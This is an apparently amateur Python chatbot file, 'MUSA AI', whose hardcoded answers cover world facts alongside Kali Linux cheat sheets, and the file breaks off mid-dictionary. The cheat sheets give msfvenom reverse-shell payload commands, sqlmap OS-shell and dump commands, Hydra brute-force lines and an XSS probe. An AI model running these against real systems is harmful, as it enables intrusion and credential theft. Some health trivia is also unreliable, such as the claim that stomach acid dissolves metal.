#!/usr/bin/env python3
"""
MUSA AI - Ultimate Professional Assistant (v4.0)
Most Advanced Personal AI - Answers EVERYTHING
"""

import sys
import time
import os
import random
import math
import json
from datetime import datetime

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "4.0 - Ultimate Edition"

# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    PURPLE = '\033[35m'
    YELLOW = '\033[33m'

def cprint(text, color=Colors.OKCYAN, bold=False, end="\n"):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}", end=end)

def speak(text, slow=False):
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    lines = text.split('\n')
    for i, line in enumerate(lines):
        if i > 0:
            print(f"           ", end="", flush=True)
        for char in line:
            print(char, end="", flush=True)
            time.sleep(0.006 if not slow else 0.015)
        if i < len(lines) - 1:
            print()
    print()

def print_section(title):
    cprint(f"\n{'═' * 65}", Colors.OKCYAN)
    cprint(f"  ★ {title}", Colors.OKGREEN, bold=True)
    cprint("═" * 65, Colors.OKCYAN)

def print_answer(title, content):
    print_section(title)
    print(f"{Colors.WHITE}{content}{Colors.ENDC}")
    cprint("─" * 65, Colors.GRAY)

# ====================== SESSION MEMORY ======================
SESSION_MEMORY = []

# ====================== MEGA KNOWLEDGE BASE ======================

KNOWLEDGE_BASE = {

    # ==================== ABOUT AI ====================
    "who are you": f"""
╔══════════════════════════════════════════════════════╗
║           MUSA AI v4.0 - ULTIMATE EDITION           ║
╚══════════════════════════════════════════════════════╝

Main Kya Hoon:
  Mein MUSA AI hoon — ek professional grade AI assistant.
  Mujhe is tarah design kiya gaya hai ke mein har sawal ka
  detailed, accurate aur professional jawab doon.

Meri Specializations:
  ✦ Kali Linux & Ethical Hacking (Expert Level)
  ✦ Python Programming & Automation
  ✦ World History & Geography
  ✦ Science & Technology
  ✦ General Knowledge (Kuch bhi poochho)
  ✦ Math & Physics
  ✦ Health & Medicine
  ✦ Business & Finance
  ✦ Sports & Entertainment
  ✦ Countries & Cultures

Meri Khasiyat:
  → Har sawal ka detail jawab
  → Professional code generation
  → Smart conversation
  → Koi bhi topic cover kar sakta hoon

Main tumhara personal AI assistant hoon — poochho jo chahiye!
""",

    # ==================== WORLD / GEOGRAPHY ====================
    "world": """
🌍 HAMARI DUNIYA - COMPLETE OVERVIEW

Facts About Earth:
  • Age: 4.54 Billion years
  • Diameter: 12,742 km
  • Circumference: 40,075 km
  • 71% Water, 29% Land
  • Population: ~8.1 Billion (2024)

7 Continents:
  1. Asia          → Largest (44.6M km²) - 4.7B people
  2. Africa        → 2nd Largest - 54 countries
  3. North America → USA, Canada, Mexico etc.
  4. South America → Brazil, Argentina etc.
  5. Europe        → 44 countries, EU
  6. Australia     → Smallest continent
  7. Antarctica    → Coldest, no permanent residents

5 Oceans:
  1. Pacific  → Largest ocean
  2. Atlantic → 2nd largest
  3. Indian   → 3rd largest
  4. Southern → Around Antarctica
  5. Arctic   → Smallest, coldest

Highest Points:
  • Highest Mountain: Mount Everest (8,848.86m) - Nepal/China
  • Deepest Ocean: Mariana Trench (11,034m) - Pacific
  • Largest Desert: Sahara - Africa
  • Longest River: Nile - Africa (6,650 km)
  • Largest Country: Russia (17.1M km²)
  • Smallest Country: Vatican City (0.44 km²)
""",

    "pakistan": """
🇵🇰 PAKISTAN - COMPLETE INFORMATION

Basic Info:
  • Full Name: Islamic Republic of Pakistan
  • Capital: Islamabad
  • Largest City: Karachi
  • Population: ~230 Million
  • Area: 881,913 km²
  • Language: Urdu (national), English (official)
  • Religion: Islam (96%)
  • Currency: Pakistani Rupee (PKR)
  • Independence: 14 August 1947

Geography:
  • Located in South Asia
  • Borders: India (East), Afghanistan & Iran (West)
           China (North), Arabian Sea (South)
  • Highest Peak: K2 (8,611m) - 2nd highest in world
  • Major Rivers: Indus, Jhelum, Chenab, Ravi, Sutlej

Provinces:
  1. Punjab        → Largest by population
  2. Sindh         → Karachi (economic hub)
  3. KPK           → Peshawar
  4. Balochistan   → Largest by area
  5. Gilgit-Baltistan (Territory)
  6. AJK (Territory)

History Key Points:
  • Ancient: Indus Valley Civilization (3300 BC)
  • Mughal Era: 1526-1857
  • British Rule: 1857-1947
  • Pakistan Created: 1947 by Quaid-e-Azam M.A. Jinnah
  • 1971: East Pakistan became Bangladesh
  • Nuclear Power since: 1998

Famous People:
  • Quaid-e-Azam M.A. Jinnah (Founder)
  • Allama Iqbal (National Poet)
  • Imran Khan (Cricketer & PM)
  • Malala Yousafzai (Nobel Prize)
  • Dr. Abdul Qadeer Khan (Nuclear Scientist)
""",

    "india": """
🇮🇳 INDIA - COMPLETE INFORMATION

Basic Info:
  • Full Name: Republic of India
  • Capital: New Delhi
  • Largest City: Mumbai
  • Population: ~1.44 Billion (World's most populous)
  • Area: 3.29 Million km²
  • Languages: Hindi, English + 22 official languages
  • Currency: Indian Rupee (INR)
  • Independence: 15 August 1947

Key Facts:
  • World's largest democracy
  • 28 States, 8 Union Territories
  • Borders Pakistan, China, Nepal, Bangladesh, Bhutan, Myanmar
  • Major rivers: Ganges, Yamuna, Brahmaputra

History:
  • Ancient: Indus Valley, Vedic civilization
  • Maurya Empire: Ashoka (3rd century BC)
  • Mughal Empire: 1526-1857
  • British Raj: 1858-1947
  • Independence: 1947 (Partition with Pakistan)

Economy:
  • 5th largest economy (GDP ~$3.5 Trillion)
  • IT capital: Bangalore
  • Major industries: IT, textiles, agriculture
""",

    "china": """
🇨🇳 CHINA - COMPLETE INFORMATION

Basic Info:
  • Full Name: People's Republic of China
  • Capital: Beijing
  • Largest City: Shanghai
  • Population: ~1.41 Billion
  • Area: 9.6 Million km² (4th largest)
  • Language: Mandarin (Putonghua)
  • Currency: Yuan (CNY)
  • Government: Communist Party

Economy:
  • 2nd largest economy (GDP ~$18 Trillion)
  • World's largest exporter
  • Manufacturing superpower

Famous Things:
  • Great Wall of China
  • Forbidden City
  • Terracotta Army
  • Giant Panda
  • Invented: Paper, Printing, Gunpowder, Compass
""",

    "usa": """
🇺🇸 UNITED STATES OF AMERICA

Basic Info:
  • Capital: Washington D.C.
  • Largest City: New York City
  • Population: ~335 Million
  • Area: 9.83 Million km² (3rd or 4th largest)
  • Language: English (de facto)
  • Currency: US Dollar (USD)
  • Government: Federal Republic

Key Facts:
  • 50 States + Washington D.C.
  • World's largest economy (GDP ~$27 Trillion)
  • Military superpower
  • Founded: 4 July 1776 (Declaration of Independence)
  • President as of 2024: Joe Biden (46th), Donald Trump (47th from Jan 2025)

Famous Things:
  • Statue of Liberty
  • NASA & Space exploration
  • Hollywood
  • Silicon Valley (Tech hub)
  • Wall Street (Finance)
""",

    "saudi arabia": """
🇸🇦 SAUDI ARABIA - COMPLETE INFO

Basic Info:
  • Capital: Riyadh
  • Population: ~36 Million
  • Area: 2.15 Million km²
  • Language: Arabic
  • Currency: Saudi Riyal (SAR)
  • Religion: Islam

Key Facts:
  • Birthplace of Islam
  • Holy cities: Mecca & Medina
  • Largest oil producer (ARAMCO)
  • Member of G20
  • King: Salman bin Abdulaziz
  • Crown Prince: Mohammed bin Salman (MBS)

Economy:
  • Heavily oil-dependent
  • Vision 2030: Diversification plan
  • One of richest countries per capita
""",

    # ==================== HISTORY ====================
    "world history": """
📜 WORLD HISTORY - MAJOR ERAS

🏛️ Ancient History (3000 BC - 500 AD):
  • Mesopotamia (Iraq) - World's first civilization
  • Ancient Egypt - Pharaohs, Pyramids
  • Indus Valley - Harappa, Mohenjo-daro (Pakistan/India)
  • Ancient Greece - Democracy, Philosophy
  • Roman Empire - Largest empire of its time

⚔️ Medieval Period (500-1500 AD):
  • Byzantine Empire
  • Islamic Golden Age (700-1200 AD) - Science, Math, Medicine
  • Crusades (1095-1291)
  • Mongol Empire - Largest land empire (Genghis Khan)
  • Ottoman Empire (1299-1922)

🚀 Modern History (1500-1900):
  • Renaissance in Europe
  • Age of Exploration (Columbus, Vasco da Gama)
  • Industrial Revolution (1760-1840)
  • American Revolution (1776)
  • French Revolution (1789)
  • Napoleon Bonaparte's conquests

💣 Contemporary (1900-Present):
  • World War I (1914-1918)
  • World War II (1939-1945)
  • Cold War (1947-1991)
  • Independence movements across Asia & Africa
  • Digital Revolution (1990s-now)
  • 9/11 (2001)
  • COVID-19 Pandemic (2020)
""",

    "world war 2": """
💣 WORLD WAR II (1939-1945)

Overview:
  Most devastating war in human history
  Deaths: ~70-85 Million people

Causes:
  • Rise of Nazi Germany (Hitler)
  • Great Depression's aftermath
  • Treaty of Versailles humiliation
  • Japanese expansion in Asia
  • Failure of appeasement policy

Main Powers:
  ALLIES: USA, UK, USSR, France, China
  AXIS:   Germany, Italy, Japan

Key Events:
  1939: Germany invades Poland → War begins
  1940: Germany conquers France
  1940: Battle of Britain (RAF vs Luftwaffe)
  1941: Germany invades USSR (Operation Barbarossa)
  1941: Japan attacks Pearl Harbor → USA joins
  1942: Battle of Stalingrad (turning point)
  1944: D-Day - Allied invasion of Normandy (6 June)
  1945: Germany surrenders (8 May - VE Day)
  1945: Atomic bombs on Hiroshima & Nagasaki
  1945: Japan surrenders (2 Sept - VJ Day)

Holocaust:
  • 6 Million Jews killed by Nazi Germany
  • Total civilians killed: ~40 Million

Aftermath:
  • United Nations formed (1945)
  • Cold War between USA & USSR
  • Israel created (1948)
  • Decolonization of Asia & Africa
""",

    "world war 1": """
🌍 WORLD WAR I (1914-1918)

Also called: The Great War
Deaths: ~20 Million (military + civilian)

Cause (Immediate):
  Assassination of Archduke Franz Ferdinand
  of Austria-Hungary on 28 June 1914 in Sarajevo

Main Powers:
  ALLIES: France, Britain, Russia, Italy, USA (1917)
  CENTRAL POWERS: Germany, Austria-Hungary, Ottoman Empire

Key Events:
  1914: War begins, trench warfare starts
  1915: Gallipoli Campaign (Ottoman Empire)
  1916: Battle of the Somme (1M casualties)
  1917: USA joins; Russian Revolution
  1918: Germany surrenders - 11 November 1918 (11:11 AM)

Aftermath:
  • Treaty of Versailles (1919) - Germany blamed
  • Ottoman Empire dissolved → Turkey formed
  • Austro-Hungarian Empire collapsed
  • Led directly to WW2
""",

    "islam history": """
☪️ HISTORY OF ISLAM

Founded: 610 AD in Mecca (Arabia)
Founder: Prophet Muhammad ﷺ (PBUH)

Key Events:
  570 AD:  Birth of Prophet Muhammad ﷺ in Mecca
  610 AD:  First revelation in Cave Hira
  622 AD:  Hijra (Migration to Medina) - Islamic calendar starts
  630 AD:  Conquest of Mecca
  632 AD:  Death of Prophet Muhammad ﷺ

Caliphs (Khulafa-e-Rashideen):
  1. Hazrat Abu Bakr Siddiq (632-634)
  2. Hazrat Umar ibn Khattab (634-644)
  3. Hazrat Uthman ibn Affan (644-656)
  4. Hazrat Ali ibn Abi Talib (656-661)

Major Empires:
  • Umayyad Caliphate (661-750) - Damascus
  • Abbasid Caliphate (750-1258) - Baghdad (Golden Age)
  • Ottoman Empire (1299-1922) - Istanbul

Islamic Golden Age (800-1200 AD):
  • Al-Khawarizmi → Algebra (Algorithm)
  • Ibn Sina (Avicenna) → Medicine
  • Al-Biruni → Astronomy & Geography
  • Ibn Rushd → Philosophy

Spread:
  Islam spread from Arabia to:
  Middle East, North Africa, Spain, Central Asia,
  South Asia (Pakistan, India, Bangladesh),
  Southeast Asia (Indonesia, Malaysia)

Today:
  • 1.9 Billion Muslims worldwide
  • 2nd largest religion
  • 57 Muslim-majority countries
""",

    "mughal empire": """
🏯 MUGHAL EMPIRE (1526-1857)

Founded by: Babur (1526) after Battle of Panipat
Capital: Agra → Delhi (Shahjahanabad)
Peak Territory: Most of South Asia

Famous Mughal Emperors:
  1. Babur (1526-1530)     → Founder, from Fergana (Uzbekistan)
  2. Humayun (1530-1556)   → Lost & regained throne
  3. Akbar (1556-1605)     → Greatest ruler, religious tolerance
  4. Jahangir (1605-1627)  → Art lover
  5. Shah Jahan (1628-1658)→ Built Taj Mahal
  6. Aurangzeb (1658-1707) → Largest territory, strict Islamic law
  7. Bahadur Shah Zafar    → Last Emperor (exiled by British 1857)

Famous Monuments:
  • Taj Mahal (Shah Jahan for Mumtaz)
  • Red Fort, Delhi
  • Badshahi Mosque, Lahore (Aurangzeb)
  • Shalimar Gardens
  • Lahore Fort

Legacy:
  • Urdu language developed
  • Mughal architecture style
  • Mixed Persian-Indian culture
""",

    # ==================== SCIENCE ====================
    "science": """
🔬 SCIENCE - OVERVIEW

Major Branches:
  Physics    → Matter, energy, forces, universe
  Chemistry  → Elements, compounds, reactions
  Biology    → Living organisms
  Astronomy  → Stars, planets, universe
  Geology    → Earth's structure

Greatest Scientists:
  • Isaac Newton      → Gravity, Laws of Motion
  • Albert Einstein   → Theory of Relativity (E=mc²)
  • Charles Darwin    → Evolution (Natural Selection)
  • Marie Curie       → Radioactivity (2x Nobel Prize)
  • Galileo Galilei   → Telescope, heliocentrism
  • Stephen Hawking   → Black holes, cosmology
  • Nikola Tesla      → Electricity, AC power

Key Scientific Theories:
  • Big Bang Theory   → Universe origin (13.8 Billion years ago)
  • Evolution         → Species change over time
  • Relativity        → Space-time, E=mc²
  • Quantum Mechanics → Subatomic particles
  • Plate Tectonics   → Continental drift
""",

    "solar system": """
☀️ SOLAR SYSTEM - COMPLETE GUIDE

Our Sun:
  • Type: G-type main sequence star
  • Age: 4.6 Billion years
  • Temperature: 5,500°C (surface), 15M°C (core)
  • Comprises 99.86% of solar system's mass

8 Planets (In order):
  1. Mercury  → Smallest, closest to Sun, no atmosphere
  2. Venus    → Hottest (462°C), Earth's twin in size
  3. Earth    → Our home, only known life
  4. Mars     → Red planet, 2 moons, Olympus Mons
  5. Jupiter  → Largest planet, 95 moons, Great Red Spot
  6. Saturn   → Ring system, 146 moons, least dense
  7. Uranus   → Ice giant, rotates on side
  8. Neptune  → Farthest, strongest winds

Special Objects:
  • Moon       → Earth's natural satellite
  • Asteroid Belt → Between Mars & Jupiter
  • Pluto      → Dwarf planet (reclassified 2006)
  • Comets     → Ice & dust from outer solar system

Space Milestones:
  1957 → Sputnik 1 (First satellite - USSR)
  1961 → Yuri Gagarin (First human in space)
  1969 → Neil Armstrong (First on Moon)
  2004 → Mars rovers (Spirit & Opportunity)
  2023 → India's Chandrayaan-3 (Moon south pole)
""",

    "human body": """
🫀 HUMAN BODY - AMAZING FACTS

Basic Stats:
  • Cells: ~37 Trillion
  • Bones: 206 (babies have 270)
  • Muscles: ~640
  • Brain neurons: ~86 Billion
  • Heart beats: ~100,000 per day
  • Blood vessels: 96,000 km long
  • DNA: If stretched = 2x Earth-Sun distance

Major Systems:
  1. Circulatory  → Heart, blood, vessels
  2. Respiratory  → Lungs, breathing
  3. Digestive    → Stomach, intestines
  4. Nervous      → Brain, spinal cord, nerves
  5. Skeletal     → Bones, joints
  6. Muscular     → Movement
  7. Immune       → Defense against disease
  8. Endocrine    → Hormones, glands

Brain Facts:
  • Uses 20% of body's energy
  • 75% water
  • Can hold ~2.5 Petabytes of data
  • Generates 25 watts of power
  • Never stops working (even in sleep)

Amazing Facts:
  • Liver can regenerate itself
  • Stomach acid can dissolve metal
  • You have a new skeleton every 10 years
  • Humans share 60% DNA with bananas!
  • Eyes can see 10 million colors
""",

    # ==================== TECHNOLOGY ====================
    "artificial intelligence": """
🤖 ARTIFICIAL INTELLIGENCE - COMPLETE GUIDE

What is AI:
  Machines that can perform tasks that normally require
  human intelligence — thinking, learning, problem solving.

Types of AI:
  1. Narrow AI (ANI)  → Good at one specific task
                        Examples: Siri, Google Maps, Netflix
  2. General AI (AGI) → Human-level intelligence (developing)
  3. Super AI (ASI)   → Surpasses humans (theoretical)

Major AI Technologies:
  • Machine Learning (ML) → Learns from data
  • Deep Learning (DL)    → Neural networks
  • NLP                   → Understanding language
  • Computer Vision       → Understanding images
  • Robotics              → Physical AI

Famous AI Systems:
  • ChatGPT (OpenAI)    → Most popular AI chatbot
  • Claude (Anthropic)  → Advanced AI assistant
  • Gemini (Google)     → Google's AI
  • Grok (xAI)          → Elon Musk's AI
  • Copilot (Microsoft) → Coding AI
  • DALL-E              → Image generation
  • Midjourney          → Art generation

AI in Real Life:
  → Medical diagnosis
  → Self-driving cars
  → Fraud detection
  → Voice assistants
  → Recommendation systems
  → Language translation

Future:
  AGI expected: 2027-2030 (predictions vary)
  AI will transform every industry
""",

    "blockchain": """
⛓️ BLOCKCHAIN - COMPLETE EXPLANATION

What is Blockchain:
  A decentralized, distributed digital ledger that records
  transactions across many computers securely.

Key Features:
  • Decentralized (No single authority)
  • Immutable (Cannot be changed)
  • Transparent (Anyone can verify)
  • Secure (Cryptographically protected)

How it Works:
  1. Transaction happens
  2. Transaction broadcast to P2P network
  3. Network validates transaction
  4. Transaction combined with others (block)
  5. Block added to chain permanently
  6. Transaction complete!

Famous Blockchains:
  • Bitcoin    → First blockchain (2009, Satoshi Nakamoto)
  • Ethereum   → Smart contracts, DApps
  • Solana     → Fast & cheap transactions
  • Cardano    → Academic approach

Uses:
  → Cryptocurrency
  → NFTs
  → Supply chain management
  → Smart contracts
  → Healthcare records
  → Voting systems
""",

    "cryptocurrency": """
💰 CRYPTOCURRENCY - COMPLETE GUIDE

What is it:
  Digital/virtual currency secured by cryptography,
  operating on blockchain technology.

Top Cryptocurrencies:
  1. Bitcoin (BTC)      → First crypto (2009), "Digital Gold"
  2. Ethereum (ETH)     → Smart contracts platform
  3. USDT (Tether)      → Stablecoin ($1 always)
  4. BNB                → Binance's token
  5. Solana (SOL)       → Fast blockchain
  6. XRP (Ripple)       → Banking focused
  7. Cardano (ADA)      → Research-based

Key Terms:
  • Wallet    → Store your crypto
  • Exchange  → Buy/sell crypto (Binance, Coinbase)
  • Mining    → Create new coins by solving math
  • HODL      → Hold long term
  • DeFi      → Decentralized Finance
  • NFT       → Non-Fungible Token

Bitcoin History:
  2009: $0 (created by Satoshi Nakamoto)
  2010: First purchase - 2 pizzas for 10,000 BTC
  2017: $20,000 (all-time high then)
  2021: $69,000 (all-time high)
  2024: ~$60,000-70,000

Risks:
  → Very volatile (can lose 80% value)
  → Not regulated in many countries
  → Scams are common
  → Technical complexity
""",

    # ==================== HEALTH ====================
    "health": """
💊 HEALTH - COMPLETE GUIDE

Fundamentals of Good Health:
  1. Nutrition    → Eat balanced diet
  2. Exercise     → At least 150 min/week
  3. Sleep        → 7-9 hours per night
  4. Hydration    → 8-10 glasses water/day
  5. Mental Health→ Manage stress
  6. No smoking   → Avoid tobacco/alcohol

Nutrition Basics:
  Macronutrients:
  • Carbohydrates → Energy (rice, bread, fruits)
  • Proteins      → Muscle repair (meat, eggs, lentils)
  • Fats          → Brain function (nuts, oil, fish)

  Micronutrients:
  • Vitamins (A, B, C, D, E, K)
  • Minerals (Iron, Calcium, Zinc, Magnesium)

Common Diseases & Prevention:
  • Heart Disease  → Less fat, exercise, no smoking
  • Diabetes       → Less sugar, exercise, healthy weight
  • Cancer         → Early detection, healthy lifestyle
  • Hypertension   → Low salt, manage stress

Mental Health:
  → Very important, often ignored
  → Common issues: Depression, Anxiety, OCD, PTSD
  → Treatment: Therapy, medication, lifestyle

Tip:
  Prevention is better than cure!
  Regular checkups save lives.
""",

    # ==================== MATHEMATICS ====================
    "mathematics": """
🔢 MATHEMATICS - OVERVIEW

Major Branches:
  • Arithmetic    → Basic operations
  • Algebra       → Variables & equations
  • Geometry      → Shapes & spaces
  • Calculus      → Change & motion
  • Statistics    → Data analysis
  • Number Theory → Properties of numbers
  • Trigonometry  → Triangles & angles

Famous Mathematicians:
  • Euclid       → Father of Geometry
  • Pythagoras   → Pythagorean theorem (a²+b²=c²)
  • Newton       → Calculus
  • Leibniz      → Also invented Calculus
  • Gauss        → "Prince of Mathematics"
  • Al-Khwarizmi → Father of Algebra (Muslim scholar)
  • Ramanujan    → Number theory genius (India)
  • Euler        → Graph theory, e, π, i

Important Formulas:
  • Area of Circle: πr²
  • Quadratic: x = (-b ± √(b²-4ac)) / 2a
  • Pythagorean: a² + b² = c²
  • E=mc² (Einstein)

Famous Numbers:
  • π (Pi)     = 3.14159265...
  • e (Euler)  = 2.71828...
  • φ (Golden) = 1.61803...
  • √2         = 1.41421...
""",

    # ==================== PYTHON ====================
    "python": """
🐍 PYTHON PROGRAMMING - COMPLETE GUIDE

What is Python:
  High-level, interpreted, general-purpose programming language.
  Created by: Guido van Rossum (1991)

Why Python:
  ✓ Easy to read & write
  ✓ Huge community & libraries
  ✓ Used everywhere
  ✓ Great for beginners & experts

Python Uses:
  • Web Development    (Django, Flask, FastAPI)
  • Data Science       (Pandas, NumPy, Matplotlib)
  • Machine Learning   (TensorFlow, PyTorch, Sklearn)
  • Automation         (Selenium, Requests, PyAutoGUI)
  • Cybersecurity      (Scapy, Pwntools, Impacket)
  • Game Development   (Pygame)
  • Desktop Apps       (Tkinter, PyQt)

Basic Syntax:
  # Variables
  name = "MUSA AI"
  age = 25
  pi = 3.14

  # Functions
  def greet(name):
      return f"Hello {name}!"

  # Loops
  for i in range(10):
      print(i)

  # Classes
  class AI:
      def __init__(self, name):
          self.name = name

Important Libraries:
  requests → HTTP requests
  os       → Operating system
  sys      → System functions
  json     → JSON handling
  re       → Regular expressions
  socket   → Networking
  subprocess→ Run commands
""",

    # ==================== KALI LINUX ====================
    "kali linux": """
🐉 KALI LINUX - COMPLETE GUIDE

What is Kali:
  Debian-based Linux distro for penetration testing.
  Developed by: Offensive Security
  Over 600+ pre-installed security tools.

Installation:
  • Download from: kali.org
  • Can install as: Main OS, VM, WSL, Live USB

Most Important Tools:

  RECONNAISSANCE:
  • Nmap         → Port scanning
  • Amass        → Subdomain enumeration
  • theHarvester → Email, domain info
  • Shodan       → Internet-connected devices
  • Maltego      → Visual link analysis

  WEB HACKING:
  • Burp Suite   → Web app testing (intercept)
  • SQLmap       → SQL injection automation
  • Nikto        → Web server scanner
  • Gobuster     → Directory brute force
  • OWASP ZAP    → Web vulnerability scanner

  EXPLOITATION:
  • Metasploit   → Exploit framework
  • ExploitDB    → Exploit database
  • SearchSploit → Offline exploit search

  PASSWORD ATTACKS:
  • Hydra        → Network login brute force
  • John the Ripper → Password cracker
  • Hashcat      → GPU-accelerated cracking
  • CrunchGen    → Wordlist generator

  WIRELESS:
  • Aircrack-ng  → WiFi cracking suite
  • Wifite       → Automated WiFi attacks
  • Kismet       → Wireless network detector

  POST EXPLOITATION:
  • LinPEAS      → Linux privilege escalation
  • WinPEAS      → Windows privilege escalation
  • BloodHound   → AD attack paths
  • Mimikatz     → Windows credential dump

Essential Commands:
  ifconfig / ip a          → Network info
  nmap -sV -sC target      → Basic scan
  msfconsole               → Start Metasploit
  sqlmap -u "URL" --dbs    → SQL injection
  hydra -l admin -P wordlist ssh://target
""",

    "nmap": """
🔍 NMAP - COMPLETE GUIDE

Nmap = Network Mapper
Used for: Network discovery, port scanning, OS detection

BASIC SCANS:
  nmap 192.168.1.1              → Basic scan
  nmap 192.168.1.0/24           → Scan whole network
  nmap -p 80,443,22 target      → Specific ports
  nmap -p- target               → All 65535 ports
  nmap -p 1-1000 target         → Port range

SERVICE DETECTION:
  nmap -sV target               → Service versions
  nmap -sC target               → Default scripts
  nmap -sV -sC target           → Both (MOST USED)
  nmap -A target                → Aggressive (OS+scripts)

SCAN TYPES:
  nmap -sS target               → SYN scan (stealth)
  nmap -sU target               → UDP scan
  nmap -sT target               → TCP connect scan
  nmap -sP 192.168.1.0/24       → Ping scan (host discovery)

SPEED:
  nmap -T0 target               → Paranoid (slowest)
  nmap -T3 target               → Normal (default)
  nmap -T4 target               → Aggressive (faster)
  nmap -T5 target               → Insane (fastest)

NSE SCRIPTS:
  nmap --script vuln target     → Vulnerability scan
  nmap --script http-enum target→ HTTP enumeration
  nmap --script smb-vuln* target→ SMB vulnerabilities
  nmap --script all target      → ALL scripts (slow)

OUTPUT:
  nmap -oN output.txt target    → Normal output
  nmap -oX output.xml target    → XML output
  nmap -oG output.gnmap target  → Grepable
  nmap -oA output target        → All formats

ADVANCED:
  nmap -D RND:10 target         → Decoy scan
  nmap -f target                → Fragmented packets
  nmap --source-port 53 target  → Source port spoof
""",

    "metasploit": """
⚔️ METASPLOIT - COMPLETE GUIDE

Start: msfconsole

BASIC WORKFLOW:
  search [keyword]         → Find modules
  use [module path]        → Select module
  info                     → Module information
  show options             → See required options
  set RHOSTS [target]      → Set target
  set LHOST [your_ip]      → Set your IP
  set LPORT [port]         → Set port
  run / exploit            → Execute

SEARCH EXAMPLES:
  search ms17-010          → EternalBlue (WannaCry)
  search vsftpd            → FTP exploit
  search type:exploit platform:windows

COMMON EXPLOITS:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/unix/ftp/vsftpd_234_backdoor
  exploit/multi/handler    → Catch reverse shells

PAYLOADS:
  show payloads
  set payload windows/meterpreter/reverse_tcp
  set payload linux/x64/meterpreter/reverse_tcp

METERPRETER COMMANDS:
  sysinfo          → System information
  getuid           → Current user
  getsystem        → Privilege escalation
  hashdump         → Dump password hashes
  upload file      → Upload file
  download file    → Download file
  screenshot       → Take screenshot
  shell            → Get system shell
  background       → Background session
  sessions -l      → List sessions
  sessions -i 1    → Interact with session

GENERATE PAYLOADS (msfvenom):
  msfvenom -p windows/meterpreter/reverse_tcp \\
    LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe

  msfvenom -p linux/x64/meterpreter/reverse_tcp \\
    LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf
""",

    "sqlmap": """
💉 SQLMAP - SQL INJECTION TOOL

Basic Usage:
  sqlmap -u "http://site.com/page.php?id=1"

DETECTION:
  sqlmap -u "URL" --dbs           → List databases
  sqlmap -u "URL" -D dbname --tables     → List tables
  sqlmap -u "URL" -D db -T table --dump  → Dump data

POST REQUESTS:
  sqlmap -u "URL" --data="user=a&pass=b"
  sqlmap -u "URL" --data="user=a&pass=b" -p user

WITH COOKIES:
  sqlmap -u "URL" --cookie="PHPSESSID=abc123"

ADVANCED:
  sqlmap -u "URL" --level=5 --risk=3  → More tests
  sqlmap -u "URL" --random-agent       → Random user agent
  sqlmap -u "URL" --tor               → Use Tor
  sqlmap -u "URL" --batch             → No user input
  sqlmap -u "URL" --os-shell          → Get OS shell
  sqlmap -u "URL" --sql-shell         → SQL shell

BURP REQUEST FILE:
  sqlmap -r request.txt               → Use saved request

BYPASS WAF:
  sqlmap -u "URL" --tamper=space2comment
  sqlmap -u "URL" --tamper=between,randomcase
""",

    "hydra": """
🔑 HYDRA - PASSWORD BRUTE FORCING

Basic Syntax:
  hydra -l user -p pass target service

Common Services:
  hydra -l admin -P passwords.txt target ssh
  hydra -l admin -P passwords.txt target ftp
  hydra -l admin -P passwords.txt target rdp
  hydra -l admin -P passwords.txt target smtp
  hydra -l admin -P passwords.txt target mysql

WEB FORMS:
  hydra -l admin -P pass.txt target \\
    http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

OPTIONS:
  -l user       → Single username
  -L users.txt  → Username list
  -p pass       → Single password
  -P pass.txt   → Password list
  -t 16         → Threads (default 16)
  -s port       → Custom port
  -V            → Verbose (show each attempt)
  -f            → Stop after first find

EXAMPLE FULL:
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
    192.168.1.100 ssh -t 4 -V
""",

    "burp suite": """
🕷️ BURP SUITE - WEB HACKING

What is it:
  Most powerful web application security testing platform.
  Used by: Bug bounty hunters, pen testers, security researchers

Main Features:
  • Intercept Proxy   → Intercept/modify HTTP traffic
  • Repeater         → Manually resend requests
  • Intruder         → Automated attacks (brute force, fuzzing)
  • Scanner          → Auto vulnerability discovery (Pro)
  • Decoder          → Encode/decode data
  • Sequencer        → Session token analysis

Setup:
  1. Start Burp Suite
  2. Configure browser proxy: 127.0.0.1:8080
  3. Install Burp CA certificate in browser
  4. Browse target → Burp captures traffic

Intercept & Modify:
  → Turn Intercept ON
  → Browse to target page
  → Modify request parameters
  → Forward modified request

SQL Injection Testing:
  → Capture login request
  → Send to Repeater
  → Add ' to parameters
  → Check response

XSS Testing:
  → Inject: <script>alert(1)</script>
  → Check if reflected in response
""",

    # ==================== LIFE ADVICE ====================
    "success": """
🏆 HOW TO BE SUCCESSFUL

Success means different things to different people.
But here are UNIVERSAL principles:

Core Principles:
  1. CLEAR GOALS      → Know exactly what you want
  2. CONSISTENCY      → Small daily actions add up
  3. LEARN ALWAYS     → Never stop growing
  4. RESILIENCE       → Failures are lessons
  5. RELATIONSHIPS    → Network matters
  6. DISCIPLINE       → Do it even when you don't want to
  7. PATIENCE         → Success takes time

Daily Habits of Successful People:
  ✦ Wake up early
  ✦ Exercise regularly
  ✦ Read books (Leaders are readers)
  ✦ Plan your day
  ✦ Review goals weekly
  ✦ Sleep 7-8 hours
  ✦ Meditate / reflect

Warren Buffett says:
  "The best investment you can make is in yourself."

Key Wisdom:
  → Focus on process, not just outcome
  → Comparison is the thief of joy
  → Your environment shapes you
  → Delayed gratification = success
  → Find your WHY
""",

    "how to make money": """
💵 HOW TO MAKE MONEY - REAL GUIDE

Traditional Ways:
  • Get educated → Get good job → Earn salary
  • Freelancing (Fiverr, Upwork, Toptal)
  • Start a business
  • Invest in stocks/real estate

Online Income Sources:
  1. Freelancing
     → Programming, design, writing
     → Platforms: Fiverr, Upwork
     → Potential: $500-$5000/month

  2. YouTube
     → Content creation
     → Monetize with ads
     → Time to earn: 6-12 months

  3. Programming
     → Web development: $50-150/hour
     → App development: $50-200/hour

  4. Cybersecurity
     → Bug Bounty: Hackerone, Bugcrowd
     → Pen Testing: $100-300/hour
